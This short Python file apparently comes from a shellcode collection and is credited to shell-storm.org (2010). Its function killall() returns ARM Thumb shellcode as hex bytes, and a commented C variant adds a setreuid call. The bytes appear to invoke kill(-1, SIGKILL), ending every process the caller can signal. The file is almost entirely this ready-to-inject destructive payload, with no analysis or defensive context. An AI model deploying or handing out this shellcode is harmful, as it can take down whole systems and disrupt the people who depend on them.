#http://shell-storm.org/shellcode/files/shellcode-667.php
#Author: Jonathan Salwan
#Date:   2010-06-29
#Tested: ARM926EJ-S rev 5 (v5l)

#Done


def killall():
	#Without setreuid
	shellcode =  r"\x01\x30\x8f\xe2"
	shellcode += r"\x13\xff\x2f\xe1"
	shellcode += r"\x92\x1a\x10\x1c"
	shellcode += r"\x01\x38\x09\x21"
	shellcode += r"\x25\x27\x01\xdf"
	return shellcode

"""
	char *SC = "\x01\x30\x8f\xe2"
           "\x13\xff\x2f\xe1"
           "\x24\x1b\x20\x1c"
           "\x17\x27\x01\xdf"
           "\x92\x1a\x10\x1c"
           "\x01\x38\x09\x21"
           "\x25\x27\x01\xdf";
"""